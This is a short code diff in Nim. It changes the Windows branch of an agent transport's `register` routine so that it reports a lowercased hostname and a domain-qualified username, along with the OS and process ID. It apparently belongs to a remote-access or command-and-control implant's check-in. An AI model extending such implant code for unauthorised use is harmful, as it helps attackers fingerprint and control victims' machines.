@@ -162,8 +162,10 @@ else:
 
   proc register*(t: var AgentTransport): bool =
     when defined(windows):
-      let hostname = getEnvStr("COMPUTERNAME", "UNKNOWN")
-      let username = getEnvStr("USERNAME", "UNKNOWN")
+      let hostname = getEnvStr("COMPUTERNAME", "UNKNOWN").toLowerAscii()
+      let domainU  = getEnvStr("USERDOMAIN", "")
+      let userOnly = getEnvStr("USERNAME", "UNKNOWN")
+      let username = if domainU.len > 0: domainU & "\\" & userOnly else: userOnly
       let osStr    = "windows/amd64"
       let pidVal   = int(GetCurrentProcessId())
     else:
